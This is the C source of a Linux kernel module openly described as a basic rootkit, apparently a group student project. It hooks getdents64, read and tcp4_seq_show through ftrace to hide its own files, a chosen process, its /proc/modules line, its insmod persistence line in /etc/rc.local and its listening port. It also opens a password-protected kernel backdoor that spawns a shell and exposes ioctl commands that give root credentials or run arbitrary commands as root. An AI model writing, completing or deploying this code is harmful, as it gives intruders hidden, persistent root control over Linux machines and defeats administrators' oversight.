#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/miscdevice.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include "rootkit.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Groupe 4");
MODULE_DESCRIPTION("Developpement d'un rootkit de base pour Linux");
MODULE_VERSION("1.0");

/**
 * The struct ftrace_hook represents a hook for function tracing in C programming.
 * @property {char} name - The `name` property in the `ftrace_hook` struct is a pointer to a constant
 * character string that represents the name of the hook.
 * @property {void} function - The `function` property in the `ftrace_hook` struct is a pointer to the
 * function that will be used as a hook or replacement for the original function.
 * @property {void} original - The `original` property in the `ftrace_hook` struct is a pointer to the
 * original function that is being hooked or intercepted by the ftrace mechanism. This pointer allows
 * the hooking mechanism to call the original function from within the hook function, enabling the hook
 * to modify or extend the behavior of
 * @property {unsigned long} address - The `address` property in the `ftrace_hook` struct is of type
 * `unsigned long` and represents the memory address where the hook is located in the system. This
 * address is used to locate and modify the function being hooked during runtime.
 * @property ops - The `ops` property in the `struct ftrace_hook` is of type `struct ftrace_ops`. It is
 * a structure that contains function pointers and other data related to the ftrace operations for the
 * hook. This structure is likely used to manage the hook's interaction with the ftrace subsystem in
 */
struct ftrace_hook
{
    const char *name;
    void *function;
    void *original;
    unsigned long address;
    struct ftrace_ops ops;
};

typedef asmlinkage long (*orig_getdents64_t)(const struct pt_regs *);

static orig_getdents64_t orig_getdents64;
static orig_read_t orig_read;

static struct ftrace_hook getdents_hook;
static struct ftrace_hook read_hook;
static struct ftrace_hook tcp_seq_hook;
static struct socket *backdoor_sock = NULL;

static pid_t pid_to_hide = 0;
static int backdoor_port = 0;
char rk_msg[RK_MSG_MAX];
static char backdoor_password[BACKDOOR_PASS_MAX] = "";
static struct task_struct *backdoor_thread = NULL;


/**
 * The function `new_getdents64` is a static hook for getdents64 that calls the original syscall, 
 * copies directory entries into kernel buffer, 
 * removes entries matching a module/script name or a hidden PID under /proc, 
 * then writes back filtered results to user space and returns the new entry count
 *
 * @param regs The `regs` parameter in the `new_getdents64` function is a pointer to a structure of
 * type `pt_regs`, which likely contains the processor registers and other relevant information for the
 * system call being intercepted and modified.
 *
 * @return The function `new_getdents64` returns a `long` value, which is the number of bytes read from
 * the `getdents64` system call after filtering out certain directory entries.
 */
static asmlinkage long new_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->si;
    long ret = 0;
    unsigned long uret = 0;
    struct linux_dirent64 *kbuf = NULL;
    struct linux_dirent64 *cur = NULL;
    unsigned long bpos = 0;

    char *path = NULL;
    struct file *repertory = NULL;
    char buffer[256];
    char *endptr = NULL;

    ret = orig_getdents64(regs);
    
    if (ret <= 0) {
        return ret;
    }
    
    repertory = fget((int)regs->di);
    if (!repertory) {
        return ret;
    }
    path = d_path(&repertory->f_path, buffer, sizeof(buffer));
    fput(repertory);

    if (IS_ERR(path)) {
        return ret;
    }
    kbuf = kzalloc(ret, GFP_KERNEL);
    
    if (!kbuf) {
        pr_err("Allocation mémoire échouée\n");
        return -ENOMEM;
    }

    if (copy_from_user(kbuf, dirent, ret)) {
        kfree(kbuf);
        return -EFAULT;
    }
    uret = (unsigned long)ret;

    while (bpos < uret) {
        cur = (struct linux_dirent64 *)((char *)kbuf + bpos);
        unsigned short reclen = cur->d_reclen;
        if (strcmp(cur->d_name, NAME_MODULE) == 0 || strcmp(cur->d_name, HIDDEN_SCRIPT) == 0) {
            memmove(cur, (char *)cur + reclen, uret - bpos - reclen);
            uret -= reclen;
            continue;
        }
        if (path != NULL && strcmp(path, "/proc") == 0 && pid_to_hide != 0) {
            unsigned long pid = simple_strtoul(cur->d_name, &endptr, 10);
            if (*endptr == '\0' && pid == pid_to_hide) {
                memmove(cur, (char *)cur + reclen, uret - bpos - reclen);
                uret -= reclen;
                continue;
            }
        }
        bpos += cur->d_reclen;
    }
    ret = (long)uret;

    if (copy_to_user(dirent, kbuf, ret)) {
        kfree(kbuf);
        return -EFAULT;
    }

    kfree(kbuf);
    return ret;
}

/**
 * @brief   Replaces the sys_read syscall to filter data read
 *          by userspace processes.
 *
 * @details This function is registered as an ftrace hook on
 *          __x64_sys_read. It lets the original syscall execute,
 *          then intercepts the returned buffer to remove
 *          sensitive lines depending on the file being read:
 *            - /proc/modules  : removes the line containing NAME_MODULE
 *            - PERSIST_FILE   : removes the line containing "insmod"
 *            - RK_CMD_FILE    : injects rk_msg in place of the real content
 *
 * @param   regs  CPU registers at syscall time.
 *                regs->di = fd (file descriptor)
 *                regs->si = user buffer (read destination)
 *                regs->dx = requested size
 *
 * @return  Number of bytes returned to the process after filtering.
 *          Returns the original sys_read value if no filtering needed.
 *          Returns -EFAULT on copy error.
 *
 * @note    All memory allocated with kzalloc must be freed with
 *          kfree before each return to avoid memory leaks.
 */
static asmlinkage long new_read(const struct pt_regs *regs)
{
    char *end;
    long ret = 0;
    char buf[256];
    int fd = regs->di;
    struct file *filter = fget(fd);

    if (!filter) {
        return ret;
    }

    char *path_fd = d_path(&filter->f_path, buf, sizeof(buf));
    
    fput(filter);

    if (IS_ERR(path_fd)) {
        return orig_read(regs);
    }

    if (strcmp(path_fd, "/tmp/.rk_cmd") == 0) {
        uid_t uid = current_uid().val;
        if (uid != 0 && uid != 1000)
            return ret;

        if (strlen(rk_msg) == 0) {
            return ret;
        }

        if (copy_to_user((void __user *)regs->si, rk_msg, strlen(rk_msg)))
            return -EFAULT;

        return strlen(rk_msg);
    }

    ret = orig_read(regs);

    if (ret <= 0)
        return ret;

    if (strcmp(path_fd, "/proc/modules") == 0) {
        char *kbuf;

        kbuf = kzalloc(ret + 1, GFP_KERNEL);
        
        if (!kbuf)
            return -ENOMEM;

        if (copy_from_user(kbuf, (void __user *)regs->si, ret)) {
            kfree(kbuf);
            return -EFAULT;
        }
        kbuf[ret] = '\0';
        
        if (kbuf != NULL) {
            char *line = strstr(kbuf, NAME_MODULE);

            if (!line) {
                kfree(kbuf);
                return ret;
            }

            end = strchr(line, '\n');

            if (end != NULL) {
                end++;
                memmove(line, end, strlen(end) + 1);

                ret -= end - line;
            } else {
                *kbuf = '\0';
            }
        }

        if (copy_to_user((void __user *)regs->si, kbuf, ret)) {
            kfree(kbuf);
            return -EFAULT;
        }

        kfree(kbuf);
    }

    if (strcmp(path_fd, "/etc/rc.local") == 0) {
        char *kbuf;

        kbuf = kzalloc(ret + 1, GFP_KERNEL);
        if (!kbuf)
            return -ENOMEM;

        if (copy_from_user(kbuf, (void __user *)regs->si, ret)) {
            kfree(kbuf);
            return -EFAULT;
        }
        kbuf[ret] = '\0';
        if (kbuf != NULL) {
            char *line = strstr(kbuf, "insmod");

            if (!line) {
                kfree(kbuf);
                return ret;
            }

            end = strchr(line, '\n');

            if (end != NULL) {
                end++;
                memmove(line, end, strlen(end) + 1);
                ret -= end - line;
            } else {
                *kbuf = '\0';
            }
        }

        if (copy_to_user((void __user *)regs->si, kbuf, ret)) {
            kfree(kbuf);
            return -EFAULT;
        }

        kfree(kbuf);
    }

    return ret;
};

static int new_tcp4_seq_show(struct seq_file *seq, void *v)
{
    if (v != SEQ_START_TOKEN) {
        struct sock *sk = v;
        if (sk->sk_num == (unsigned short)backdoor_port)
            return 0;
    }
    return ((int (*)(struct seq_file *, void *))tcp_seq_hook.original)(seq, v);
}


/**
 * The `hook_callback` function is a static function that modifies the instruction pointer in the
 * `pt_regs` structure if the parent instruction pointer is not within the current module.
 *
 * @param ip The `ip` parameter in the `hook_callback` function represents the instruction pointer,
 * which is the memory address of the next instruction to be executed.
 * @param parent_ip The `parent_ip` parameter in the `hook_callback` function represents the
 * instruction pointer value of the parent function that called the function being traced.
 * @param ops The `ops` parameter is a pointer to a `struct ftrace_ops` which contains information
 * about the ftrace operation being performed.
 * @param fregs The `fregs` parameter in the `hook_callback` function is of type `struct ftrace_regs
 * *`. It is a pointer to a structure that contains register values at the time the function was
 * called.
 *
 * @return The function `hook_callback` is returning void.
 */
static void notrace hook_callback(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct ftrace_regs *fregs)
{
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
    struct pt_regs *regs = ftrace_get_regs(fregs);

    if (!regs)
        return;

    if (!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long)hook->function;
}


/**
 * The function `install_read_hook` sets up a hook for the `__x64_sys_read` function using ftrace in
 * the Linux kernel.
 * 
 * @param lookup The `lookup` parameter is a function pointer of type `kallsyms_lookup_name_t`. This
 * function is used to look up the address of a symbol by name in the kernel symbol table. In the
 * provided code snippet, it is being used to find the address of the symbol "__x64_sys
 * 
 * @return The function `install_read_hook` returns an integer value. If everything is successful, it
 * returns 0. If there is an error during the installation process, it returns the corresponding error
 * code.
 */
static int install_read_hook(kallsyms_lookup_name_t lookup)
{
    int ret;

    read_hook.name = "__x64_sys_read";
    read_hook.function = new_read;
    read_hook.original = &orig_read;
    
    read_hook.address = lookup(read_hook.name);

    if (!read_hook.address) {
        pr_err("[-] Symbol not found: __x64_sys_read\n");
        return -ENOENT;
    }
    pr_info("[+] %s @ 0x%lx\n", read_hook.name, read_hook.address);
    
    orig_read = (orig_read_t)read_hook.address;
    
    read_hook.ops.func = hook_callback;
    read_hook.ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY;
    
    ret = ftrace_set_filter_ip(&read_hook.ops, read_hook.address, 0, 0);
    
    if (ret) {
        pr_err("[-] ftrace_set_filter_ip (read): %d\n", ret);
        return ret;
    }
    
    ret = register_ftrace_function(&read_hook.ops);
    
    if (ret) {
        pr_err("[-] register_ftrace_function (read): %d\n", ret);
        ftrace_set_filter_ip(&read_hook.ops, read_hook.address, 1, 0);
        return ret;
    }
    
    return 0;
}

/**
 * The function `install_tcp_hook` sets up a hook on the `tcp4_seq_show` function for tracing and
 * modification purposes.
 * 
 * @param lookup The `lookup` parameter in the `install_tcp_hook` function is a function pointer to a
 * function that performs a symbol lookup in the kernel symbol table. This function is used to find the
 * address of the symbol `tcp4_seq_show` which is needed for setting up a hook on the TCP sequence
 * 
 * @return The function `install_tcp_hook` returns an integer value. If the function completes
 * successfully, it returns 0. If there are any errors during the installation of the TCP hook, it
 * returns the corresponding error code.
 */
static int install_tcp_hook(kallsyms_lookup_name_t lookup)
{
    tcp_seq_hook.name = "tcp4_seq_show";
    tcp_seq_hook.function = new_tcp4_seq_show;
    tcp_seq_hook.original = NULL;
    tcp_seq_hook.address = lookup(tcp_seq_hook.name);

    if (!tcp_seq_hook.address) {
        pr_err("[-] Symbol not found: tcp4_seq_show\n");
        return -ENOENT;
    }

    pr_info("[+] tcp4_seq_show @ 0x%lx\n", tcp_seq_hook.address);
    tcp_seq_hook.original = (void *)tcp_seq_hook.address;
    
    tcp_seq_hook.ops.func = hook_callback;
    tcp_seq_hook.ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY;

    int ret = ftrace_set_filter_ip(&tcp_seq_hook.ops, tcp_seq_hook.address, 0, 0);
    if (ret) {
        pr_err("[-] ftrace_set_filter_ip (tcp): %d\n", ret);
        return ret;
    }

    ret = register_ftrace_function(&tcp_seq_hook.ops);
    if (ret) {
        pr_err("[-] register_ftrace_function (tcp): %d\n", ret);
        ftrace_set_filter_ip(&tcp_seq_hook.ops, tcp_seq_hook.address, 1, 0);
        return ret;
    }
    
    return 0;
}

/**
 * The function `install_hook` sets up a hook for the `__x64_sys_getdents64` system call using kprobes
 * and ftrace in the Linux kernel.
 *
 * @return The `install_hook` function returns an integer value. If the function executes successfully,
 * it returns 0. If there are any errors during the execution of the function, it returns the
 * corresponding error code.
 */

/**
 * @brief   Registers new_read as an ftrace hook on __x64_sys_read.
 *
 * @details Resolves the address of __x64_sys_read via the lookup
 *          pointer provided by install_hook(). Configures the
 *          read_hook structure and registers it with ftrace to
 *          intercept all sys_read calls system-wide.
 *          Must be called from rootkit_init() after install_hook().
 *
 * @param   lookup  Pointer to kallsyms_lookup_name, provided by
 *                  install_hook() after resolution via kprobe.
 *
 * @return  0 on success.
 *          -ENOENT if __x64_sys_read symbol is not found.
 *          Negative error code if ftrace_set_filter_ip or
 *          register_ftrace_function fail.
 */
static int install_hook(void)
{
    kallsyms_lookup_name_t lookup;
    struct kprobe kp = {.symbol_name = "kallsyms_lookup_name"};
    int ret;

    ret = register_kprobe(&kp);
    if (ret < 0)
    {
        pr_err("[-] register_kprobe: %d\n", ret);
        return ret;
    }
    lookup = (kallsyms_lookup_name_t)kp.addr;
    unregister_kprobe(&kp);

    getdents_hook.name = "__x64_sys_getdents64";
    getdents_hook.function = new_getdents64;
    getdents_hook.original = &orig_getdents64;

    getdents_hook.address = lookup(getdents_hook.name);
    if (!getdents_hook.address)
    {
        pr_err("[-] Symbol not found\n");
        return -ENOENT;
    }
    pr_info("[+] %s @ 0x%lx\n", getdents_hook.name, getdents_hook.address);

    orig_getdents64 = (orig_getdents64_t)getdents_hook.address;

    getdents_hook.ops.func = hook_callback;
    getdents_hook.ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY;

    ret = ftrace_set_filter_ip(&getdents_hook.ops, getdents_hook.address, 0, 0);
    if (ret)
    {
        pr_err("[-] ftrace_set_filter_ip: %d\n", ret);
        return ret;
    }

    ret = register_ftrace_function(&getdents_hook.ops);
    if (ret)
    {
        pr_err("[-] register_ftrace_function: %d\n", ret);
        ftrace_set_filter_ip(&getdents_hook.ops, getdents_hook.address, 1, 0);
        return ret;
    }

    install_read_hook(lookup);
    install_tcp_hook(lookup);
    return 0;
}

/**
 * @brief   Unregisters the ftrace hook on __x64_sys_read.
 *
 * @details Calls unregister_ftrace_function() then clears the
 *          address filter with ftrace_set_filter_ip(). Must be
 *          called from rootkit_exit() before misc_deregister().
 *          Without this call, the hook stays active after rmmod
 *          and causes a kernel crash (call to unloaded address).
 *
 * @return  void
 *
 * @warning Do not omit this call in rootkit_exit(). An ftrace hook
 *          not removed at module unload causes a kernel panic.
 */
static void uninstall_read_hook(void)
{
    if (read_hook.ops.func != NULL) {
        int ret = unregister_ftrace_function(&read_hook.ops);
        if (ret) {
            printk(KERN_ERR "rootkit: failed to unregister ftrace function (%d)\n", ret);
        }
    }
    if (read_hook.address != 0) {
        int ret = ftrace_set_filter_ip(&read_hook.ops, read_hook.address, 1, 0);
        if (ret) {
            printk(KERN_ERR "rootkit: failed to clear ftrace filter (%d)\n", ret);
        }
    }
}

/**
 * The function `uninstall_tcp_hook` is responsible for unregistering a ftrace function related to TCP
 * and clearing the ftrace filter.
 */
static void uninstall_tcp_hook(void)
{
    if (tcp_seq_hook.ops.func != NULL) {
        int ret = unregister_ftrace_function(&tcp_seq_hook.ops);
        if (ret) {
            printk(KERN_ERR "rootkit: failed to unregister ftrace function (tcp) (%d)\n", ret);
        }
    }
    if (tcp_seq_hook.address != 0) {
        int ret = ftrace_set_filter_ip(&tcp_seq_hook.ops, tcp_seq_hook.address, 1, 0);
        if (ret) {
            printk(KERN_ERR "rootkit: failed to clear ftrace filter (tcp) (%d)\n", ret);
        }
    }
}

/**
 * The function `handle_backdoor_connection` accepts a connection, receives a message, and executes a
 * shell if the received message matches a predefined password.
 * 
 * @return The function `handle_backdoor_connection` returns an integer value, which is 0 in this case.
 */
static int handle_backdoor_connection(void)
{
    struct socket *client_sock;
    struct msghdr msg = {0};
    char buf[32] = {0};
    struct kvec vec = {.iov_base = buf, .iov_len = sizeof(buf) - 1};
    int ret = 0;
    int len = 0;

    ret = kernel_accept(backdoor_sock, &client_sock, 0);
    if (ret < 0)
        return ret;

    len = kernel_recvmsg(client_sock, &msg, &vec, 1, sizeof(buf), 0);
    if (len <= 0)
        goto close_client;

    if (strlen(backdoor_password) > 0 && strncmp(buf, backdoor_password,
        strlen(backdoor_password)) == 0) {
        char *argv[] = {"/bin/sh", NULL};
        char *envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL};
        call_usermodehelper("/bin/sh", argv, envp, UMH_WAIT_EXEC);
    }

    close_client:
        sock_release(client_sock);
    return 0;
}

/**
 * The function `backdoor_thread_fn` runs a loop to handle backdoor connections until the thread is
 * stopped.
 * 
 * @param data In the provided code snippet, the `data` parameter is a void pointer that is passed to
 * the `backdoor_thread_fn` function. This parameter can be used to pass any additional data or context
 * information required by the thread function. In this case, it seems that the `data` parameter is
 * 
 * @return The function `backdoor_thread_fn` is returning an integer value of 0.
 */
static int backdoor_thread_fn(void *data)
{
    int ret = 0;
    while (!kthread_should_stop()) {
        ret = handle_backdoor_connection();
        if (ret < 0 && ret != -EINTR)
            msleep(100); 
    }
    return 0;
}

/**
 * The function `open_backdoor_port` creates a TCP socket, binds it to a specified port, and listens
 * for incoming connections.
 * 
 * @param port The `port` parameter in the `open_backdoor_port` function is an integer that specifies
 * the port number on which the backdoor will be opened for communication.
 * 
 * @return The function `open_backdoor_port` returns an integer value. If the function is successful in
 * opening the backdoor port, it returns 0. If there is an error during the process, it returns a
 * negative value indicating the error code.
 */
static int open_backdoor_port(int port)
{
    struct sockaddr_in addr;
    int ret;

    if (backdoor_sock)
        sock_release(backdoor_sock);

    ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &backdoor_sock);
    if (ret < 0)
        return ret;

    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = htonl(INADDR_ANY);

    ret = kernel_bind(backdoor_sock, (struct sockaddr_unsized *)&addr, sizeof(addr));
    if (ret < 0)
        goto out;

    ret = kernel_listen(backdoor_sock, 1);
    if (ret < 0)
        goto out;

    backdoor_thread = kthread_run(backdoor_thread_fn, NULL, "backdoor_thread");
    if (IS_ERR(backdoor_thread)) {
        backdoor_thread = NULL;
        printk(KERN_ERR "rootkit: failed to create backdoor thread\n");
    }

    backdoor_port = port;
    pr_info("[+] Backdoor ouverte sur le port %d\n", port);
    return 0;

    out:
        sock_release(backdoor_sock);
        backdoor_sock = NULL;
    return ret;
}


/**
 * The function `close_backdoor_port` closes a backdoor port if it is open.
 */
static void close_backdoor_port(void)
{
    if (backdoor_thread) {
        kthread_stop(backdoor_thread);
        backdoor_thread = NULL;
    }

    if (backdoor_sock) {
        sock_release(backdoor_sock);
        backdoor_sock = NULL;
        backdoor_port = 0;
        pr_info("[+] Backdoor fermée\n");
    }
}

/**
 * The function `handle_escalation` in the given code snippet handles privilege escalation either by
 * PID or by executing a command as root.
 * 
 * @param args The `handle_escalation` function takes a pointer to a `struct rk_args` named `args` as a
 * parameter. This structure likely contains information needed for privilege escalation, such as the
 * method of escalation (`value`), the target process ID or command, etc.
 * 
 * @return The function `handle_escalation` returns an integer value. In the different scenarios within
 * the function, it returns different error codes or success codes based on the outcome of the
 * operations.
 */
static int handle_escalation(struct rk_args *args)
{
    if (args->value == RK_PRIVESC_BY_PID) {
        struct cred * new_cred = prepare_kernel_cred(NULL);
        if (!new_cred) {
            printk(KERN_ERR "rootkit: prepare_kernel_cred failed\n");
            return -ENOMEM;
        }

        struct pid *pid_struct = find_get_pid(args->target);
        struct task_struct *task = get_pid_task(pid_struct, PIDTYPE_PID);
        put_pid(pid_struct);
        
        if (!task) {
            put_cred(new_cred);
            printk(KERN_ERR "rootkit: PID %lu not found\n", args->target);
            return -ESRCH;
        }
        commit_creds(new_cred);
        printk(KERN_INFO "rootkit: escalade de privilèges réussie pour PID=%lu\n", args->target);
    
    } else if (args->value ==  RK_PRIVESC_BY_CMD) {
        char cmd[256];
        char __user *cmd_user = (char __user *)args->target;

        memset(cmd, 0, sizeof(cmd));
        if (copy_from_user(cmd, cmd_user, sizeof(cmd) - 1)) {
            printk(KERN_ERR "rootkit: copy_from_user failed\n");
            return -EFAULT;
        }
        cmd[sizeof(cmd) - 1] = '\0';
        char *argv[] = {"/bin/sh", "-c", cmd, NULL};
        char *envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL};
        int ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
        
        if (ret < 0) {
            printk(KERN_ERR "rootkit: call_usermodehelper failed with command '%s'\n", cmd);
            return ret;
        }
        printk(KERN_INFO "rootkit: escalade de privilèges réussie avec la commande '%s'\n", cmd);
        return ret;
    } else {
        printk(KERN_ERR "rootkit: invalid escalation method %u\n", args->value);
        return -EINVAL;
    }
    return 0;
}

/**
 * The function `rk_ioctl` handles different commands related to a rootkit, such as privilege
 * escalation, hiding a process ID, and retrieving the user ID.
 *
 * @param file The `file` parameter in the `rk_ioctl` function represents a pointer to a structure that
 * contains information about the opened file. This structure typically includes details such as the
 * file descriptor, file operations, and other file-related information. In the context of the
 * `rk_ioctl` function, this parameter is
 * @param cmd The `cmd` parameter in the `rk_ioctl` function represents the command that is being
 * passed to the ioctl system call. It is an unsigned integer that is used to determine the specific
 * operation that the driver should perform. The driver checks the type of the command using
 * `_IOC_TYPE(cmd)` and then
 * @param arg The `arg` parameter in the `rk_ioctl` function represents the argument passed to the
 * ioctl system call. It is of type `unsigned long` and is used to pass data between user space and
 * kernel space. In this function, it is being used to receive a pointer to `struct rk_args
 *
 * @return The function `rk_ioctl` returns an integer value. In the provided code snippet, if the
 * command `cmd` does not match the predefined `RK_MAGIC` value, it returns `-ENOTTY`. If the command
 * matches one of the defined cases (`RK_CMD_HELLO`, `RK_CMD_PRIVESC`, `RK_CMD_HIDE_PID`,
 * `RK_CMD_GETUID`), it performs specific actions
 */
static long rk_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
    struct rk_args args;

    if (_IOC_TYPE(cmd) != RK_MAGIC)
        return -ENOTTY;

    switch (cmd) {

    case RK_CMD_PRIVESC:
        if (copy_from_user(&args, (struct rk_args __user *)arg, sizeof(args)))
            return -EFAULT;
        printk(KERN_INFO "rootkit: PRIVESC pour PID=%lu\n", args.target);
        return handle_escalation(&args);
        break;

    case RK_CMD_HIDE_PID:
        if (copy_from_user(&args, (struct rk_args __user *)arg, sizeof(args)))
            return -EFAULT;
        printk(KERN_INFO "rootkit: HIDE_PID pour PID=%lu\n", args.target);
        pid_to_hide = (pid_t)args.target;
        break;

    case RK_CMD_GETUID:
        args.target = (unsigned int)current_uid().val;
        args.value = 0;
        if (copy_to_user((struct rk_args __user *)arg, &args, sizeof(args)))
            return -EFAULT;
        printk(KERN_INFO "rootkit: GETUID uid=%lu\n", args.target);
        break;

    case RK_CMD_SET_MSG:
        if (copy_from_user(&args, (struct rk_args __user *)arg, sizeof(args)))
            return -EFAULT;

        if (strncpy_from_user(rk_msg,
                              (const char __user *)(unsigned long)args.target,
                              RK_MSG_MAX - 1) < 0)
            return -EFAULT;

        rk_msg[RK_MSG_MAX - 1] = '\0';
    break;
        
    case RK_CMD_OPEN_BACKDOOR:
        if (copy_from_user(&args, (struct rk_args __user *)arg, sizeof(args)))
            return -EFAULT;

        if (open_backdoor_port((int)args.target) < 0)
            return -EFAULT;
    break;

    case RK_CMD_SET_BACKDOOR_PASS:
        if (copy_from_user(&args, (struct rk_args __user *)arg, sizeof(args)))
            return -EFAULT;

        if (strncpy_from_user(backdoor_password,
                            (const char __user *)(unsigned long)args.target,
                            BACKDOOR_PASS_MAX - 1) < 0)
            return -EFAULT;

        backdoor_password[BACKDOOR_PASS_MAX - 1] = '\0';
    break;


    default:
        return -ENOTTY;
    }

    return 0;
}

/**
 * The function `rk_open` restricts access based on user ID and logs messages accordingly.
 *
 * @param inode The `inode` parameter in the `rk_open` function is a pointer to a structure that
 * represents an inode in the Linux file system. The inode data structure contains metadata about a
 * file or directory, such as permissions, ownership, size, and pointers to data blocks.
 * @param file The `file` parameter in the `rk_open` function is a pointer to a structure of type
 * `struct file`. This structure represents an open file in the kernel and contains information about
 * the file, such as its file descriptor, file operations, and other relevant data.
 *
 * @return The function `rk_open` is returning an integer value. If the conditions are met (uid is not
 * 0 and not 1000), it will return `-EACCES` indicating a permission denied error. Otherwise, if the
 * conditions are not met, it will return `0` indicating success.
 */
static int rk_open(struct inode *inode, struct file *file)
{
    uid_t uid = current_uid().val;
    if (uid != 0 && uid != 1000)
    {
        printk(KERN_ALERT "rootkit: accès refusé à l'UID %u\n", uid);
        return -EACCES;
    }

    printk(KERN_INFO "rootkit: opened\n");
    return 0;
}

/**
 * The function `rk_release` is a static function in C that logs a message when a file is closed.
 *
 * @param inode The `inode` parameter in the `rk_release` function is a pointer to a structure that
 * represents an inode in the Linux kernel. The inode data structure contains metadata about a file or
 * directory, such as permissions, timestamps, and pointers to data blocks.
 * @param file The `file` parameter in the `rk_release` function is a pointer to a structure of type
 * `struct file`. This structure represents an open file in the kernel and contains information about
 * the file, such as its file descriptor, file operations, and other relevant data.
 *
 * @return The function `rk_release` is returning an integer value of 0.
 */
static int rk_release(struct inode *inode, struct file *file)
{
    printk(KERN_INFO "rootkit: closed\n");
    return 0;
}

/* The above code is defining a static constant structure named `rk_fops` with file operations for a
Linux kernel module. The structure contains function pointers for opening a file (`open`), releasing
a file (`release`), and handling I/O control operations (`unlocked_ioctl`). The `owner` field is set
to `THIS_MODULE`, which is a macro that represents the module owning the file operations. */
static const struct file_operations rk_fops = {
    .owner = THIS_MODULE,
    .open = rk_open,
    .release = rk_release,
    .unlocked_ioctl = rk_ioctl,
};

/* The above code is defining a static struct `rk_misc` of type `miscdevice`. It initializes the
members of the struct with the following values:
- `minor` is set to `MISC_DYNAMIC_MINOR`
- `name` is set to `NAME_MODULE`
- `fops` is set to the address of the struct `rk_fops` */
static struct miscdevice rk_misc = {
    .minor = MISC_DYNAMIC_MINOR,
    .name = NAME_MODULE,
    .fops = &rk_fops,
};

/**
 * The rootkit_init function registers a miscellaneous device and installs a hook, returning 0 if
 * successful.
 *
 * @return The `rootkit_init` function is returning an integer value. If the function executes
 * successfully without any errors, it will return 0. If there is an error during the registration of
 * the miscellaneous device or the installation of the hook, the corresponding error code will be
 * returned.
 */
static int __init rootkit_init(void)
{
    int ret;

    ret = misc_register(&rk_misc);
    if (ret) {
        printk(KERN_ERR "rootkit: misc_register failed (%d)\n", ret);
        return ret;
    }

    ret = install_hook();

    if (ret) {
        printk(KERN_ERR "[-] Erreur installation hook TCP\n");
        misc_deregister(&rk_misc);
        return -ENOENT;
    }

    printk(KERN_INFO "rootkit: loaded — /dev/rootkit (minor=%d)\n",
        rk_misc.minor);
    return 0;
}

/**
 * The rootkit_exit function unregisters ftrace functions and clears filters before unloading the
 * rootkit module.
 */
static void __exit rootkit_exit(void)
{
    misc_deregister(&rk_misc);
    if (getdents_hook.ops.func != NULL) {
        int ret = unregister_ftrace_function(&getdents_hook.ops);
        if (ret) {
            printk(KERN_ERR "rootkit: failed to unregister ftrace function (%d)\n", ret);
        }
    }

    if (getdents_hook.address != 0) {
        int ret = ftrace_set_filter_ip(&getdents_hook.ops, getdents_hook.address, 1, 0);
        
        if (ret) {
            printk(KERN_ERR "rootkit: failed to clear ftrace filter (%d)\n", ret);
        }
    }

    uninstall_read_hook();
    
    uninstall_tcp_hook();
    
    
    synchronize_rcu();
    close_backdoor_port();
    printk(KERN_INFO "rootkit: unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
